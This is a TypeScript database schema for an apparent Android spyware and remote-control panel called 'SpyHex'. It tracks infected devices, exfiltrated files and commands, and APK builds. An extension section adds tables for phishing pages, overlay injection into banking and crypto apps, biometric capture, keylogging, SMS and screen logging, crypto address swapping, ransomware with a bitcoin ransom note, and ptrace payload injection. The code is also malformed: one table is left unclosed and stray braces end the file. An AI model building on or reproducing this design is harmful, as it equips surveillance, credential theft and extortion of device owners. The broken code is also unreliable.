import { sqliteTable, text, integer, blob, uniqueIndex } from 'drizzle-orm/sqlite-core';

export const user = sqliteTable('user', {
  id: text('id').primaryKey(),
  email: text('email').notNull().unique(),
  emailVerified: integer('email_verified', { mode: 'boolean' }).notNull().default(false),
  name: text('name').notNull(),
  image: text('image'),
  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  role: text('role').notNull().default('user'),
  banned: integer('banned', { mode: 'boolean' }).default(false),
  banReason: text('ban_reason'),
  banExpires: integer('ban_expires', { mode: 'timestamp' }),
  username: text('username').notNull().default(''),
  permissions: text('permissions').notNull().default('[]'),
  isDefault: integer('is_default').default(0),
  lastLogin: integer('last_login', { mode: 'timestamp' }),
  deviceSecret: text('device_secret'),
});
export const session = sqliteTable('session', {
  id: text('id').primaryKey(),
  userId: text('user_id').notNull().references(() => user.id, { onDelete: 'cascade' }),
  expiresAt: integer('expires_at', { mode: 'timestamp' }).notNull(),
  token: text('token').notNull().unique(),
  ipAddress: text('ip_address'),
  userAgent: text('user_agent'),
  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  impersonatedBy: text('impersonated_by'),
});
export const account = sqliteTable('account', {
  id: text('id').primaryKey(),
  providerId: text('provider_id').notNull(),
  accountId: text('account_id').notNull(),
  userId: text('user_id').notNull().references(() => user.id, { onDelete: 'cascade' }),
  accessToken: text('access_token'),
  refreshToken: text('refresh_token'),
  idToken: text('id_token'),
  accessTokenExpiresAt: integer('access_token_expires_at', { mode: 'timestamp' }),
  refreshTokenExpiresAt: integer('refresh_token_expires_at', { mode: 'timestamp' }),
  scope: text('scope'),
  password: text('password'),
  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
});
export const verification = sqliteTable('verification', {
  id: text('id').primaryKey(),
  value: text('value').notNull(),
  expiresAt: integer('expires_at', { mode: 'timestamp' }).notNull(),
  identifier: text('identifier').notNull(),
  createdAt: integer('created_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).notNull().$defaultFn(() => new Date()),
});
export const clients = sqliteTable('clients', {
  id: text('id').primaryKey(),
  ownerId: text('owner_id'),
  ip: text('ip').default(''),
  country: text('country'),
  city: text('city'),
  timezone: text('timezone'),
  firstSeen: text('first_seen').$defaultFn(() => new Date().toISOString()),
  lastSeen: text('last_seen').$defaultFn(() => new Date().toISOString()),
  online: integer('online', { mode: 'boolean' }).default(false),
  reconnectCount: integer('reconnect_count').default(0),
  deviceModel: text('device_model'),
  deviceBrand: text('device_brand'),
  deviceVersion: text('device_version'),
  spyhexHidden: integer('spyhex_hidden', { mode: 'boolean' }).default(false),
  cameraPermission: integer('camera_permission', { mode: 'boolean' }).default(false),
  currentPath: text('current_path').default(''),
  gpsInterval: integer('gps_interval').default(0),
  deviceInfo: text('device_info'),
});
export const clientData = sqliteTable('client_data', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  dataType: text('data_type').notNull(),
  data: text('data').default('[]'),
  updatedAt: text('updated_at').$defaultFn(() => new Date().toISOString()),
}, (table) => [
  uniqueIndex('idx_client_data_unique').on(table.clientId, table.dataType),
]);
export const clientFiles = sqliteTable('client_files', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  fileType: text('file_type').notNull(),
  originalName: text('original_name').notNull(),
  mimeType: text('mime_type'),
  data: blob('data').notNull(),
  fileSize: integer('file_size').default(0),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
});
export const logs = sqliteTable('logs', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  type: text('type').notNull().default('INFO'),
  category: text('category').notNull().default('SYSTEM'),
  message: text('message').notNull(),
  details: text('details'),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
});
export const buildRecords = sqliteTable('build_records', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  userId: text('user_id'),
  serverUrl: text('server_url').notNull(),
  homePageUrl: text('home_page_url').notNull(),
  appName: text('app_name').notNull().default('SpyHex'),
  status: text('status', { enum: ['completed', 'failed'] }).default('completed'),
  apkData: blob('apk_data'),
  fileSize: integer('file_size').default(0),
  createdAt: text('created_at').$defaultFn(() => new Date().toISOString()),
  completedAt: text('completed_at'),
});
export const settings = sqliteTable('settings', {
  key: text('key').primaryKey(),
  value: text('value').notNull(),
  updatedAt: text('updated_at').$defaultFn(() => new Date().toISOString()),
});
export const loginAttempts = sqliteTable('login_attempts', {
  id: integer('id').primaryKey({ autoIncrement: true }),
  ip: text('ip').notNull(),
  identifier: text('identifier').notNull().default(''),
  attemptedAt: text('attempted_at').notNull().$defaultFn(() => new Date().toISOString()),
});
export const commands = sqliteTable('commands', {
  id: text('id').primaryKey(),
  clientId: text('client_id').notNull().references(() => clients.id, { onDelete: 'cascade' }),
  cmdType: text('cmd_type').notNull(),
  params: text('params').default('{}'),
  status: text('status', { enum: ['sent', 'delivered', 'responded', 'failed'] }).notNull().default('sent'),
  sentAt: text('sent_at').notNull().$defaultFn(() => new Date().toISOString()),
  deliveredAt: text('delivered_at'),
  respondedAt: text('responded_at'),
  responseSummary: text('response_summary'),
});
export const jwtSecret = sqliteTable('jwt_secret', {
  id: integer('id').primaryKey(),
  secret: text('secret').notNull(),


// === SPYHEX WUZEN EXTENSION TABLES ===

export const phishlets = sqliteTable('phishlets', {
  id: text('id').primaryKey(),
  name: text('name').notNull(),
  targetApp: text('target_app').notNull(),
  templateHtml: text('template_html').notNull(),
  captureFields: text('capture_fields').notNull(), // JSON array
  enabled: integer('enabled', { mode: 'boolean' }).notNull().default(true),
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const injections = sqliteTable('injections', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull(),
  targetApp: text('target_app').notNull(), // package name
  appCategory: text('app_category').notNull(), // social | crypto | finance
  injectionType: text('injection_type').notNull(), // overlay | hook | replace
  payload: text('payload').notNull(),
  enabled: integer('enabled', { mode: 'boolean' }).notNull().default(true),
  lastTriggered: integer('last_triggered', { mode: 'timestamp' }),
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const biometrics = sqliteTable('biometrics', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull(),
  bioType: text('bio_type').notNull(), // fingerprint | face | iris
  captureData: blob('capture_data'), // raw biometric data
  imageData: text('image_data'), // base64 image
  confidence: integer('confidence'),
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const screenlogs = sqliteTable('screenlogs', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull(),
  screenshot: text('screenshot').notNull(), // base64
  activeApp: text('active_app'),
  timestamp: integer('timestamp', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const toolkitConfig = sqliteTable('toolkit_config', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull().unique(),
  keylogger: integer('keylogger', { mode: 'boolean' }).default(false),
  notificationLogs: integer('notification_logs', { mode: 'boolean' }).default(false),
  screenlogger: integer('screenlogger', { mode: 'boolean' }).default(false),
  smsLogs: integer('sms_logs', { mode: 'boolean' }).default(false),
  cryptoSwap: integer('crypto_swap', { mode: 'boolean' }).default(false),
  showNotifications: integer('show_notifications', { mode: 'boolean' }).default(false),
  updatedAt: integer('updated_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const ransomwareConfig = sqliteTable('ransomware_config', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull().unique(),
  enabled: integer('enabled', { mode: 'boolean' }).default(false),
  ransomTitle: text('ransom_title').default('Your files have been encrypted'),
  ransomBody: text('ransom_body').default('Send 0.5 BTC to decrypt'),
  walletAddress: text('wallet_address'),
  encryptedPaths: text('encrypted_paths'), // JSON array
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const addresses = sqliteTable('addresses', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull(),
  label: text('label').notNull(),
  address: text('address').notNull(),
  cryptoType: text('crypto_type').notNull(), // btc | eth | bnb | usdt
  network: text('network').default('mainnet'),
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const automataScripts = sqliteTable('automata_scripts', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull(),
  name: text('name').notNull(),
  script: text('script').notNull(), // JSON automation steps
  enabled: integer('enabled', { mode: 'boolean' }).default(false),
  lastRun: integer('last_run', { mode: 'timestamp' }),
  runCount: integer('run_count').default(0),
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const syringePayloads = sqliteTable('syringe_payloads', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull(),
  name: text('name').notNull(),
  payloadType: text('payload_type').notNull(), // dex | so | js | binary
  payloadData: blob('payload_data'),
  targetProcess: text('target_process'),
  injectionMethod: text('injection_method').default('ptrace'),
  executed: integer('executed', { mode: 'boolean' }).default(false),
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const aiAnalysis = sqliteTable('ai_analysis', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull(),
  analysisType: text('analysis_type').notNull(), // pin | pattern | behavior | credential
  result: text('result').notNull(),
  confidence: integer('confidence'),
  rawData: text('raw_data'), // JSON
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const firewallRules = sqliteTable('firewall_rules', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull(),
  ruleType: text('rule_type').notNull(), // block | allow
  target: text('target').notNull(), // ip | domain | app
  targetValue: text('target_value').notNull(),
  enabled: integer('enabled', { mode: 'boolean' }).default(true),
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const pushNotifications = sqliteTable('push_notifications', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull(),
  title: text('title').notNull(),
  body: text('body').notNull(),
  icon: text('icon'),
  actionUrl: text('action_url'),
  sent: integer('sent', { mode: 'boolean' }).default(false),
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});

export const launchIntents = sqliteTable('launch_intents', {
  id: text('id').primaryKey(),
  deviceId: text('device_id').notNull(),
  intentType: text('intent_type').notNull(), // app | inapp_link | external_link
  target: text('target').notNull(), // package name or URL
  executed: integer('executed', { mode: 'boolean' }).default(false),
  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),
});
});
